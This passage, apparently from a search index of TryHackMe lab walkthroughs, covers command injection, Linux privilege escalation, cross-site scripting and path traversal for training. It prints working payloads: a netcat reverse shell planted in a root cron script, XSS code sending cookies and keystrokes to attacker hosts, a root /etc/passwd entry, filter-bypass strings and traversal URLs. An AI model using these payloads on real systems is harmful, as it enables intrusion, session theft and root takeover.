vulnerabilities exist because applications often use functions in programming languages such as PHP, Python, and NodeJS to pass data to and make system calls to the machine's OS. Take for example the code snippet below. Here the application takes data that the user enters in an input field to search a directory for a song title.</p> <pre><code>&lt;?php\n$song = \"/var/www/html/songs\"\n\nif (isset $_GET[\"title\"]){\n    $title = $_GET[\"title\"];\n\n    $command = \"grep $title /var/www/html/songtitle.txt\";\n\n    $search = exec($command);\n    if ($search == \"\"){\n        $return = \"The requested song $title does not exist!\";\n    } else{\n        $return = \"The requested song $title does exist!\";\n    }\n\n    echo $return;\n}\n?&gt;\n</code></pre> <p>In the code snippet above, the application stores MP3 in the <code>/var/www/html/songs</code> directory on the OS. The user input <code>$title</code> is passed to the command <code>grep</code> to search a text file named songtitle.txt. The output of this search determines whether the application informs the user if the song exists or not.</p> <p>An attacker could abuse this application by injecting their own commands for the application to execute. Abusing applications this way can be possible no matter the programming language the application uses. As long as the application processes and executes it, it can result in command injection. An example of of an application written in Python is presented below.</p> <pre><code>import subprocess\n\nfrom flask import Flask\napp = Flast(__name__)\n\ndef execute_command(shell):\n    return subprocess.Popen(shell, shell=True, stdout=subprocess.PIPE).stdout.read()\n\n@app.route('/&lt;shell&gt;')\ndef command_server(shell):\n    return execute_command(shell)\n</code></pre> <p>The application above uses the flask Python package to setup a web server. The function is defined which uses the subprocess package to execute a command on the device. Finally a route is used in the web server that will execute what is provided. For example, to execute the command <code>whoami</code>, a user will need to visit <code>http://flaskapp.thm/whoami</code>.</p>"},{"location":"walkthroughs/thm/commandinjection/#task-3-exploiting-command-injection","title":"Task 3 - Exploiting Command Injection","text":"<p>You can often determine whether or not command injection may occur based on the behaviour of the application. Applications that use user input to populate system commands with data can often be combined in unintended behaviour. For example, the shell operators <code>;</code>, <code>&amp;</code>, and <code>&amp;&amp;</code> will combine two (or more) system commands and execute them both.</p> <p>Command Injection can be detected in one of two ways:</p> <ol> <li>Blind Command Injection: This type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviour of the application to determine whether or not the payload was successful.</li> <li>Verbose Command Injection: This type of injection is where there is direct feedback from the application. </li> </ol>"},{"location":"walkthroughs/thm/commandinjection/#detecting-blind-command-injection","title":"Detecting Blind Command Injection","text":"<p>For blind command injection, we will need to use payloads that will cause some time delay. For example, the <code>ping</code> and <code>sleep</code> commands are significant payloads to test with as they cause the system to hang and execute the command before proceeding.</p> <p>Another method of detecting blind command injection is by forcing some type of output. This can be done by using the redirect operator such as <code>&gt;</code> to write the output of a command to a file whose contents can then be read to determine if the command was successful.</p> <p>Testing command injection this way is often complicated and requires a bit of experimentation. The <code>curl</code> command is also a great way to test for command injection. This is because you are able able to use <code>curl</code> to deliver data to and from an application in your payload. Take for example the command below:</p> <pre><code>curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami\n</code></pre>"},{"location":"walkthroughs/thm/commandinjection/#detecting-verbose-command-injection","title":"Detecting Verbose Command Injection","text":"<p>Verbose command injection is easier to detect as the application gives you the feedback or output as what is happening or being executed. The results will be directly displayed on the web application.</p>"},{"location":"walkthroughs/thm/commandinjection/#useful-payloads","title":"Useful Payloads","text":"<p>The following are some valuable payloads for both Linux and Windows.</p>"},{"location":"walkthroughs/thm/commandinjection/#linux-payloads","title":"Linux Payloads","text":"Payload Description whoami See what user the application is running under. ls List the contents of the current directory. ping This command will invoke the application to hang. This is useful in testing an application for blind command injection. sleep This is another useful payload in testing an application for blind command injection. nc Netcat can be used to spawn a reverse shell onto the vulnerable application."},{"location":"walkthroughs/thm/commandinjection/#windows-payloads","title":"Windows Payloads","text":"Payload Description whoami See what user the application is running under. dir List the contents of t he current directory. ping This command will invoke the application to hang. This is useful in testing an application for blind command injection. timeout This command will also invoke the application to hang."},{"location":"walkthroughs/thm/commandinjection/#remediating-command-injection","title":"Remediating Command Injection","text":"<p>Command injection can be prevented in a variety of ways. Let's look at some PHP examples below.</p>"},{"location":"walkthroughs/thm/commandinjection/#vulnerable-functions","title":"Vulnerable Functions","text":"<p>In PHP, many functions interact with the operating system to execute commands via shell. These include:</p> <ul> <li>Exec</li> <li>Passthru</li> <li>System</li> </ul> <p>These functions take input such as a string or user data and will execute whatever is provided on the system. Any application that uses these functions without proper checks will be vulnerable to command injection.</p> <p>Take the following code snippet for example. Here, the application will only accept and process numbers that are input into the form. This means that any command such as <code>whoami</code> will not be processed.</p> <pre><code>&lt;input type=\"text\" id=\"ping\" name=\"ping\" pattern=\"[0-9]+\"&gt;&lt;/input&gt;\n\n&lt;?php\necho passthru(\"/bin/ping -c 4 \"$_GET[\"ping\"].\");\n?&gt;\n</code></pre> <p>Here the application will only accept a specific patter of characters (the digits 0-9) and will then only proceed to execute this data (which is all numerical).</p>"},{"location":"walkthroughs/thm/commandinjection/#input-sanitization","title":"Input Sanitization","text":"<p>Sanitizing user input is a great way to prevent command injection. This is a process of specifying the formats or types of data that a user can submit. For example, an input field that only accepts numerical data or removes any special characters such as <code>&gt;</code>, <code>&amp;</code>, and <code>/</code>.</p> <p>In the code snippet below, the <code>filter_input</code> PHP function is used to check whether or not any data submitted via an input form is a number or not.</p> <pre><code>&lt;?php\nif (!filter_input(INPUT_GET, \"number\", FILTER_VALIDATE_NUMBER)){\n\n}\n?&gt;\n</code></pre>"},{"location":"walkthroughs/thm/commandinjection/#bypassing-filters","title":"Bypassing Filters","text":"<p>Applications will employ numerous techniques in filtering and sanitizing user input. These filters restrict the use of specific payloads. We can abuse the logic behind an application to bypass these filters. For example, an application may strip out quotation marks; we can instead use the hexadecimal value of this to achieve the same result.</p> <p>When executed, although the data will be in a different format that what is expected, it can still be interpreted and will have the same result.</p> <pre><code>$payload = \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"\n</code></pre>"},{"location":"walkthroughs/thm/commandinjection/#task-5-practical-command-injection","title":"Task 5 - Practical: Command Injection","text":"<p>Let's look at a practical example of command injection. The task provides us with a web application and asks us to find the contents of the flag located at <code>/home/tryhackme/flag.txt</code>.</p> <p></p> <p>Inputting a valid IP address, we are presented with the output of what appears to be a <code>ping</code> command.</p> <p></p> <p>We can find what user the <code>ping</code> command is running under by appending a <code>;whoami</code> to the ip address, making our payload <code>127.0.0.1;whoami</code>.</p> <p></p> <p>To read the contents of the flag file, we can use the <code>cat</code> command.</p> <p></p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/","title":"Common Linux Privesc","text":""},{"location":"walkthroughs/thm/commonlinuxprivesc/#introduction","title":"Introduction","text":"<p>This room covers common Linux privilege escalation vulnerabilities and techniques.</p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#task-2-understanding-privesc","title":"Task 2 - Understanding Privesc","text":"<p>At its core, privilege escalation involves going from a lower permission to a higher permission. On a technical level, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an OS or application to gain unauthorized access to resources that are usually restricted for the typical users.</p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#task-3-direction-of-privilege-escalation","title":"Task 3 - Direction of Privilege Escalation","text":"<p>Privilege escalation can happen in two directions:</p> <ul> <li>Horizontal privilege escalation: Here you pivot to a different user who is on the same privilege level as you. This allows you to inherit whatever files and access that user may have. This can be used, for example, to gain access to another normal privilege user that happens to have SUID file access which can be then be used to achieve higher privilege access.</li> <li>Vertical privilege escalation (privilege elevation): Here you attempt to gain higher privilege access with an existing account that you have already compromised. For local privilege escalation attacks, this might mean pivoting to an account with administrator or root privileges.</li> </ul>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#task-4-enumeration","title":"Task 4 - Enumeration","text":"<p>Enumeration of a target is essential when exploring privilege escalation vectors. One of the most common ways to enumerate a target host is via the use of a bash script known as LinEnum.</p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#linenum","title":"LinEnum","text":"<p>LinEnum is a simple bash script that performs common commands related to privilege escalation. Prior to running the script, it is necessary to get LinEnum onto the target machine. This can be accomplished by downloading the script directly onto the target host from the host or from a server controlled by the attacker.</p> <p>Note that the file needs executable permission prior to execution (<code>chmod +x FILENAME.sh</code>).</p> <p>LinEnum's output is broken down into different sections:</p> <ul> <li>Kernel: Kernal information is shown here. There is most likely a kernel exploit available for this machine.</li> <li>Can we read/write sensitive files: The world-writable files are shown in this section. These are files that any authenticated user can read and write to (even if normally they shouldn't).</li> <li>SUID Files: The out of the SUID files is shown here. SUID is a special type of file permission given to a file which allows the file to run with the permissions of whoever the owner is. If the owner is root, it runs with root permissions. This is a common vector for privilege escalation in CTFs.</li> <li>Crontab Contents: The scheduled cron jobs are shown in this section. Cron is used to schedule commands that execute at the specified time. These scheduled commands or tasks are know as \"cron jobs\". Related to this is the crontab command which creates a crontab file containing commands and instructions for the cron daemon to execute.</li> </ul>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#questions","title":"Questions","text":"<p>SSH into target machine using the provided credentials <code>user3:password</code>. This will act as our initial foothold on the system as a normal user privilege.</p> <p>To begin the enumeration with LinEnum, we first need to download the script onto the target machine using <code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code>.</p> <p>Mark the script as an executable.</p> <p></p> <p>Run LinEnum with the following options:</p> <pre><code>$ ./LinEnum.sh | tee linenum.output\n</code></pre> <p>In the above command we are executing LinEnum and writing the output to a file called <code>linenum.output</code> for analysis later. Note that we could use the <code>-r</code> and <code>-e</code> commands to accomplish the same thing.</p> <p>From the output of LinEnum, we can see that the target's hostname is <code>polobox</code>.</p> <p></p> <p>Under the \"Contents of /etc/passwd\" section, we find that a total of <code>8</code> \"user[x]\" are on the system.</p> <p>Under the \"Available shells\" section, we can that there are a total of <code>4</code> shells available on the system.</p> <p></p> <p>Under the \"Crontab contents\" we find that the script <code>autoscript.sh</code> is set to run every 5 minutes.</p> <p></p> <p>Going through LinEnum's output, we find that the permissions on <code>/etc/passwd</code> have been modified to give write access to the group owner.</p> <p></p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#task-5-abusing-suidguid-files","title":"Task 5 - Abusing SUID/GUID Files","text":"<p>For information on Linux file permissions and implications of SUID/GUID bits, see notes on SUID/GUID linked here.</p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#questions_1","title":"Questions","text":"<p>User3 has a file with the SUID bit set located at <code>/home/user3/shell</code>.</p> <p></p> <p>Since user3 has execute permissions on the file and the file is owned by root, executing the file gives us root privileges.</p> <p></p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#task-6-exploiting-writeable-etcpasswd","title":"Task 6 - Exploiting Writeable /etc/passwd","text":"<p>For information on Linux file permissions and implications of improper file permissions on <code>/etc/passwd</code> and <code>/etc/shadow</code> files, refer to the following notes linked here.</p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#questions_2","title":"Questions","text":"<p>Use OpenSSL to generate hash.</p> <p></p> <p>With the above hash, add the following user to the <code>/etc/passwd</code> file.</p> <pre><code>new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash\n</code></pre> <p></p> <p>With the user added, all we need to do now is use the <code>su [username]</code> command to elevate our privileges.</p> <p></p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#task-7-escaping-vi-editor","title":"Task 7 - Escaping Vi Editor","text":"<p>Let's begin by checking if we can run any command as a super user without requiring the root password. This can be accomplished by using the command <code>sudo -l</code>.</p> <p></p> <p>Looks like we are able to run the root owned <code>/usr/bin/vi</code> without the need for a root password.</p> <p>Execute the application using the command <code>sudo vi</code>. Note that the root password is not requested when running the application.</p> <p>We can exploit the fact that Vi is now running as root by escaping Vi and spawning a shell using <code>:!sh</code>. Since Vi is owned by the root user, the spawned shell will also be for the root user.</p> <p></p> <p></p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#task-8-exploiting-crontab","title":"Task 8 - Exploiting Crontab","text":"<p>For information on privilege escalation using Cron and Cron jobs, refer to notes linked here.</p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#questions_3","title":"Questions","text":"<p>Looking at the contents of <code>/etc/crontab</code> we find that a scheduled task owned by the root user executes a script every five minutes.</p> <p></p> <p>Looking at the permissions of the script, we find that the script is owned by user4 who has full privileges for the file. This is important as we can now edit the contents of the script file to permit privilege escalation.</p> <p></p> <p>Let's create a payload using msfvenom on our local machine which we can use to call back to our machine when the cron job is executed.</p> <pre><code>$ msfvenom -p cmd/unix/reverse_netcat lhost=10.13.17.49 lport=8888 R\n[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload\n[-] No arch selected, selecting arch: cmd from the payload\nNo encoder specified, outputting raw payload\nPayload size: 89 bytes\nmkfifo /tmp/puvp; nc 10.13.17.49 8888 0&lt;/tmp/puvp | /bin/sh &gt;/tmp/puvp 2&gt;&amp;1; rm /tmp/puvp\n</code></pre> <p>Note that we will need to copy the output of msfvenom to the <code>autoscript.sh</code> file on the remote machine. Before we do that, let's start our netcat listener on port 8888.</p> <pre><code>$ nc -lvnp 8888\n</code></pre> <p>Copy the output of msfvenom to the target script file on the remote machine.</p> <pre><code>$ echo \"mkfifo /tmp/puvp; nc 10.13.17.49 8888 0&lt;/tmp/puvp | /bin/sh &gt;/tmp/puvp 2&gt;&amp;1; rm /tmp/puvp\" &gt; autoscript.sh\n</code></pre> <p></p> <p>Now we just need to wait for five minutes to get a call back on our netcat listening session.</p> <p></p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#task-9-exploiting-path-variable","title":"Task 9 - Exploiting PATH Variable","text":"<p>For information on privilege escalation by exploiting PATH variables, refer to the notes linked here.</p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#questions_4","title":"Questions","text":"<p>Looking at the contents of the home directory for user5, we find a file named script with SUID bit set. Executing the binary, we find that the binary most likely calls the <code>ls</code> command to display the contents of the current directory.</p> <p></p> <p>To test whether absolute paths are used in the binary or not, let's create a custom <code>ls</code> script in the <code>/tmp</code> directory which executes <code>/bin/bash</code> when called.</p> <p></p> <p>Mark the script as executable.</p> <p></p> <p>Now we need to add <code>/tmp</code> directory to our local PATH variable. This will redirect the <code>ls</code> binary call in the SUID binary to our script file in the <code>/tmp</code> folder.</p> <p></p> <p>Now execute the script binary to get privilege escalation.</p> <p></p>"},{"location":"walkthroughs/thm/commonlinuxprivesc/#additional-resources","title":"Additional Resources","text":"<ul> <li>Payload All the Things - Linux Privilege Escalation</li> <li>LinEnum</li> <li>LinPeas</li> <li>Linux Smart Enumeration</li> </ul>"},{"location":"walkthroughs/thm/crosssitescripting/","title":"Cross-site Scripting","text":""},{"location":"walkthroughs/thm/crosssitescripting/#task-1-room-brief","title":"Task 1 - Room Brief","text":"<p>Cross-site Scripting (XSS) is classified  as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. This room covers the different types of XSS, how to create XSS payloads, and how to modify said payloads to evade filters.</p>"},{"location":"walkthroughs/thm/crosssitescripting/#task-2-xss-payloads","title":"Task 2 - XSS Payloads","text":"<p>In XSS, the payload is the JavaScript code we wish to be executed on the target's computer. There are two parts to the payload, the intention and the modification.</p> <p>The intention is what you wish the JavaScript to actually do. The modification is the changes to the code we need to make for it to execute in the given scenario.</p> <p>The following are some examples of XSS intentions:</p>"},{"location":"walkthroughs/thm/crosssitescripting/#proof-of-concept","title":"Proof of Concept","text":"<p>This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a web application. This is often done by causing an alert box to pop up on the page with a string of text.</p> <pre><code>&lt;script&gt;alert('XSS');&lt;/script&gt;\n</code></pre>"},{"location":"walkthroughs/thm/crosssitescripting/#session-stealing","title":"Session Stealing","text":"<p>Details of a user's session, such as login tokens, are often kept in cookies on the target machine. The below JavaScript takes the target's cookie, base64 encodes it to ensure successful transmission and then posts it to a website under the attacker's control to be logged. Once the attacker has the cookies, they can take over the target's session and log in as that user.</p> <pre><code>&lt;script&gt;fetch('https://attacker.thm/steal?cookie=' + btoa(document.cookie));&lt;/script&gt;\n</code></pre>"},{"location":"walkthroughs/thm/crosssitescripting/#key-logger","title":"Key Logger","text":"<p>The below code acts as a key logger. It takes anything typed by the client and forwards it to a website under the attacker's control.</p> <pre><code>&lt;script&gt;document.onkeypress = function(e) { fetch('https://attacker.thm/log?key=' + btoa(e.key) );}&lt;/script&gt;\n</code></pre>"},{"location":"walkthroughs/thm/crosssitescripting/#business-logic","title":"Business Logic","text":"<p>This payload is more specific than the above examples. This payload calls a particular network resource or a JavaScript function. For example, a JavaScript function for changing the user's email address called <code>user.changeEmail()</code>.</p> <pre><code>&lt;script&gt;user.changeEmail('attacker@hacker.thm');&lt;/script&gt;\n</code></pre>"},{"location":"walkthroughs/thm/crosssitescripting/#reflected-xss","title":"Reflected XSS","text":"<p>Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.</p> <p>Consider the following scenario where a website displays an error message when an incorrect input is entered. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source.</p> <p></p> <p>If the application doesn't check the contents of the error parameter, an attacker can insert malicious code.</p> <p></p> <p>The attacker can send the link directly to the victim or embed it into an iframe on another website containing a JavaScript payload which would get executed whenever the victim visits the malicious website or clicks on the malicious link. This is illustrated graphically below.</p> <p></p> <p>Finding Reflected XSS vectors requires testing every possible point of entry. These typically include:</p> <ul> <li>Parameters in the URL Query String</li> <li>URL File Path</li> <li>HTTP Headers (though unlikely to be exploitable in practice)</li> </ul>"},{"location":"walkthroughs/thm/crosssitescripting/#task-4-stored-xss","title":"Task 4 - Stored XSS","text":"<p>In Stored XSS, the payload is stored on the web application (in a database for example) and then gets executed when other users visit the site or web page.</p> <p>Let's consider the following scenario. Suppose there is a blog website that allows users to post comments. The developers did not implement any checks for whether the comments contain JavaScript or filter out any malicious code. If an attacker posts a comment containing JavaScript, this will be stored in the backend database, and every user who visits the page will have the JavaScript execute in their browser. This is illustrated graphically below.</p> <p></p> <p>In order to test for Stored XSS, we will need to test every possible point of entry where it seems data is stored and then displayed back in areas that other users have access to. A small example set of this could be:</p> <ul> <li>Comments section on a blog</li> <li>User profile information</li> <li>Website listing</li> </ul> <p>Sometimes, developers thing limiting input values ont he client-side is good enough protection. Changing these values to something the web application wouldn't expect is a good source of discovering stored XSS.</p>"},{"location":"walkthroughs/thm/crosssitescripting/#task-5-dom-based-xss","title":"Task 5 - DOM Based XSS","text":"<p>Document Object Model (DOM) is a programming interface for HTML and XML documents. DOM represents the page so that programs can change the document structure, style, and content. A webpage is a document which can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below.</p> <p></p> <p>DOM based XSS occurs when JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.</p> <p>For example, suppose a website's JavaScript gets the contents from the <code>window.location.hash</code> parameter and then writes that onto the page in the currently viewed section. If the contents of the hash aren't checked for malicious code, an attacker could inject JavaScript of their choosing onto the webpage.</p> <p>Testing for DOM based XSS can be challenging and requires a degree of knowledge of JavaScript to read the source code. One would need to look for parts of hte code that access certain variables that an attacker can have control over (such as window.location.x parameter).</p>"},{"location":"walkthroughs/thm/crosssitescripting/#task-6-blind-xss","title":"Task 6 - Blind XSS","text":"<p>Blind XSS is similar to stored XSS in that the payload gets stored on the website for another user to view. However, in this case, the attacker cannot see the payload working. A simple example of blind XSS is as follows.</p> <p>Suppose a website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal. Using specifically crafted payloads, the attacker's payload could make calls back to a web server under the attacker's control allowing them to hijack the staff member's session allowing access to the private portal.</p> <p>When testing for blind XSS vulnerabilities, we need to ensure our payload has a call back (usually an HTTP request). This allows us as an attacker to know when the payload has been executed.</p>"},{"location":"walkthroughs/thm/crosssitescripting/#task-7-perfecting-your-payload","title":"Task 7 - Perfecting Your Payload","text":"<p>In this task, we will work through practical examples of XSS vulnerabilities. The aim for each level will be to execute the JavaScript alert function with the string THM:</p> <pre><code>&lt;script&gt;alert('THM');&lt;/script&gt;\n</code></pre>"},{"location":"walkthroughs/thm/crosssitescripting/#level-1","title":"Level 1","text":"<p>We are presented with a form which asks us to enter our name. Once the name is entered, it is displayed on the web page.</p> <p></p> <p>Looking at the page source, we see that the name we entered is reflected in the code.</p> <p></p> <p>Let's enter our JavaScript POC.</p> <p></p> <p>If we look at the page source again, we can see that our JavaScript is reflected in the code.</p> <p></p>"},{"location":"walkthroughs/thm/crosssitescripting/#level-2","title":"Level 2","text":"<p>We are once again asked to enter our name. This time, the name is being reflected in an input tag instead.</p> <p></p> <p>We can verify this by looking at the page source.</p> <p></p> <p>In this situation, we can't simply try our previous JavaScript payload because we can't run it from inside the input tag. We instead need to escape the input tag first so that the payload can run properly. We can do this by adding an additional <code>\"&gt;</code> before our payload which would cause the interpreter to close the input tag's value parameter (due to the <code>\"</code>)and then close the input tag itself (due to the <code>&gt;</code>) before executing our payload. Our final payload would look like:</p> <p><pre><code>\"&gt;&lt;script&gt;alert('THM');&lt;/script&gt;\n</code></pre> </p> <p>Looking at the page source, we can see how our payload is able to escape the input field.</p> <p></p>"},{"location":"walkthroughs/thm/crosssitescripting/#level-3","title":"Level 3","text":"<p>In this level, we are asked again to enter our name into a dialog box. This time, our name appears to be reflected inside an HTML textarea tag.</p> <p></p> <p>This is confirmed by looking at the page source.</p> <p></p> <p>We can escape the <code>&lt;textarea&gt;</code> tag by prepending a <code>&lt;/textarea&gt;</code> tag in front of our payload. This would result in the interpreter closing the textarea tag before executing our payload. Our final payload looks like:</p> <p><pre><code>&lt;/textarea&gt;&lt;script&gt;alert('THM');&lt;/script&gt;\n</code></pre> </p> <p>Looking at the page source, we can see how our payload is able to escape the textarea element.</p> <p></p>"},{"location":"walkthroughs/thm/crosssitescripting/#level-4","title":"Level 4","text":"<p>Entering the name into the input form, we find that the our name is reflected in some JavaScript code.</p> <p></p> <p>This is confirmed by looking at the page source.</p> <p></p> <p>We can escape the existing JavaScript by using the following payload:</p> <p><pre><code>';alert('THM');//\n</code></pre> Here the <code>'</code> closes the field specifying the name. The <code>;</code> signifies the end of the current command. The <code>//</code> at the end makes anything that follows a comment rather than an executable code.</p> <p></p> <p>Looking at the page source, we can see how our payload escaped the existing JavaScript code.</p> <p></p>"},{"location":"walkthroughs/thm/crosssitescripting/#level-5","title":"Level 5","text":"<p>In this level, entering our name into the input form results in our name being reflected in the code.</p> <p></p> <p>This is confirmed by looking at the page source.</p> <p></p> <p>However, if we try to enter the payload <code>&lt;script&gt;alert('THM');&lt;/script&gt;</code> we find that the payload fails. This is because the web application appears to be running a filter that strips out any potential dangerous words. Note how the word <code>script</code> has been removed from the payload in the resultant code.</p> <p></p> <p></p> <p>When a filter which removes words from a string is being employed, we can try the following helpful trick.</p> <p><pre><code>&lt;sscriptcript&gt;alert('THM');&lt;/sscriptcript&gt;\n</code></pre> This works because most developers employ filters which compare the string to a known pattern (in our case the word script). As our script passes through the filter, the string characters matching the word script will get filtered and removed. The filter, however, does not go back and recheck the remaining string again. This results of our payload passing through the filter is <code>&lt;script&gt;alert('THM');&lt;/script&gt;</code> which should get executed.</p> <p></p> <p>Looking at the page source, we can see how our payload was altered by the filter.</p> <p></p>"},{"location":"walkthroughs/thm/crosssitescripting/#level-6","title":"Level 6","text":"<p>In this level, we are asked to enter an image path. Pressing enter and looking at the page source we can see that the image is reflected in code.</p> <p></p> <p></p> <p></p> <p>Trying to use our payload <code>\"&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code> to escape the input tag does not work. Looking at the page source, we can see why.</p> <p></p> <p>In the above image, we can see that the <code>&lt; and &gt;</code> characters get filtered out from our payload. This prevents us from escaping from the IMG tag. To get around this filter, we can take advantage of additional attributes of the IMG tag (such as the onload event).</p> <p>The onload event executes the code of your choosing when the image specified in the src attribute is loaded onto the web page.</p> <p>With this knowledge, we can modify our payload as follows:</p> <p><pre><code>/images/cat.jpg\" onload=\"alert('THM');\n</code></pre> </p> <p>Looking at the page source, we can see how our payload escapes the IMG tag.</p> <p></p>"},{"location":"walkthroughs/thm/crosssitescripting/#polyglots","title":"Polyglots","text":"<p>An XSS polyglot is a string of text which can escape attributes , tags, and bypass filters all in one. Polyglots could have been used for each of the examples above. An XSS polyglot is presented below:</p> <pre><code>jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\\x3e\n</code></pre>"},{"location":"walkthroughs/thm/crosssitescripting/#task-8-practical-example-blind-xss","title":"Task 8 - Practical Example (Blind XSS)","text":"<p>In this task, we will be looking at an example for blind XSS vulnerability.</p> <p>Let's start by creating a new account on the web application. Once the account is activated, navigate to the Support Tickets tab which is the feature we will be investigating for weaknesses.</p> <p></p> <p>Let's create a support ticket. Click on the newly created ticket and view the page source. Looking at the page source, we can see that our body text gets placed inside a textarea tag.</p> <p></p> <p></p> <p>Let's try creating another ticket with a payload to escape the textarea tag. The payload is in the form: <code>&lt;/textarea&gt;test</code>.</p> <p>Opening the new ticket and viewing the page source, we find that we have successfully escaped the textarea tag.</p> <p></p> <p></p> <p>Now let's expand on our previous payload and see if we run JavaScript and confirm that that the ticket creating feature is vulnerable to an XSS attack. Create a new ticket with the following payload:</p> <p><pre><code>&lt;/textarea&gt;&lt;script&gt;alert('THM');&lt;/script&gt;\n</code></pre> </p> <p>We can expand the payload even further and increase the impact of the vulnerability. Since this feature creates a support ticket, we can be reasonably sure that a staff member will view this ticket. We can exploit this to extract sensitive information (such as session cookies) from the staff member's machine.</p> <p>Let's craft a payload which will extract the staff member's session cookies and exfiltrate it to a server under our control. We need to begin off by starting a Netcat listener on our attack machine.</p> <p><pre><code>nc -lvnp 9001\n</code></pre> With the listener set up, let's modify our payload to meet our requirements above.</p> <p><pre><code>&lt;/textarea&gt;&lt;script&gt;fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );&lt;/script&gt;\n</code></pre> Where:</p> <ul> <li><code>&lt;/textarea&gt;</code> tag closes the textarea field.</li> <li><code>&lt;script&gt;</code> tag opens an area for us to write JavaScript code.</li> <li><code>fetch()</code> command makes an HTTP request.</li> <li><code>{URL_OR_IP}</code> is the attacker's IP.</li> <li><code>?cookie=</code> is the query string that will contain the victim's cookies.</li> <li><code>btoa()</code> command bas64 encodes the victim's cookies.</li> <li><code>document.cookie</code> accesses the victim's cookies for the current session.</li> <li><code>&lt;/script&gt;</code> closes the JavaScript code block.</li> </ul> <p>Creating a new support ticket with the following payload and waiting for a callback allows us to capture the support staff's session cookies: <code>&lt;/textarea&gt;&lt;script&gt;fetch('http://10.10.252.168:9001?cookie=' + btoa(document.cookie) );&lt;/script&gt;</code></p> <p></p> <p>Decoding the value of the <code>?cookie</code> query string gives us value of the staff-session cookie.</p> <p></p>"},{"location":"walkthroughs/thm/fileinclusion/","title":"File Inclusion","text":""},{"location":"walkthroughs/thm/fileinclusion/#task-1-what-is-file-inclusion","title":"Task 1 - What is File Inclusion?","text":"<p>This room covers the fundamentals of exploiting file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal. Risks associated with these vulnerabilities as well as required remediation techniques will also be discussed.</p> <p>A common feature of modern web applications is the ability to request access to files on a given system. The simplest and one of the most common way this is accomplished is via parameters. Parameters are query parameter strings attacked to the URL that can be used to retrieve specific data or perform actions based on user input. The following is a example of a URL where parameters are being used.</p> <p></p> <p>The URL above represents an HTTP request to the web server where file is the parameter with the value userCV.pdf which the user wishes to access.</p>"},{"location":"walkthroughs/thm/fileinclusion/#why-do-file-inclusion-vulnerabilities-happen","title":"Why do File Inclusion Vulnerabilities Happen?","text":"<p>File inclusion vulnerabilities are commonly found and exploited due to poor design and implementation on part of the developer. The main issue arises as a result of poor or non-existent input validation where the user's inputs are not sanitized or validated before being passed to the web server. This allows a user to pass malicious inputs to the web server thereby giving rise to the vulnerability.</p>"},{"location":"walkthroughs/thm/fileinclusion/#what-is-risk-of-file-inclusion","title":"What is Risk of File Inclusion?","text":"<p>Primary risk associated with file inclusion vulnerability is the disclosure of sensitive data. Without mitigation, a threat actor can exploit the vulnerability to leak sensitive information related to users or the business. Furthermore, if users are permitted to upload or write files to the web server, file inclusion vulnerabilities may be exploited to gain remote command execution (RCE).</p>"},{"location":"walkthroughs/thm/fileinclusion/#task-2-deploy-the-vm","title":"Task 2 - Deploy the VM","text":"<p>In this task, we are provided with a vulnerable VM we can deploy which will be used for the tasks to follow.</p>"},{"location":"walkthroughs/thm/fileinclusion/#task-3-path-traversal","title":"Task 3 - Path Traversal","text":"<p>Path traversal (also known as Directory Traversal) attacks allow an attacker to read operating system resources such as local files on the server running the application. Path traversal vulnerabilities occur when the user's input is not sanitized properly and is passed to functions such as <code>file_get_contents</code> in PHP. This function provides means to read the content of a file. The function itself is not vulnerable but the poor input validation or filtering implemented by the developer may allow an attacker to pass malicious queries to the function resulting in a vulnerability.</p> <p>Path traversal attacks take advantage of moving the directory one step up using the <code>../</code> syntax. If an entry point is found (such as <code>get.php?file=</code>), then the attacker can chain the above syntax to retrieve resources outside the application's root folder.</p> <p><pre><code>http://www.example.com/get.php?file=../../../../etc/passwd\n</code></pre> Each <code>../</code> moves up one directory until the OS root directory <code>/</code> is reached. Then the directory is changed to point to the resource the attacker wishes to access. This process is illustrated in the image below.</p> <p></p> <p>Similarly, if the web application runs on a Windows server, the attacker needs to provide path's compliant with the Windows OS. For example, if the attacker wants to access the <code>boot.ini</code> file located at <code>C:\\boot.ini</code>, then the attacker can try the following depending on the target OS version:</p> <p><pre><code>http://www.example.com/get.php?file=../../../../boot.ini or\n\nhttp://www.example.com/get.php?file=../../../../windows/win.ini\n</code></pre> Below are some common OS files which can be used when testing.</p> Location Description 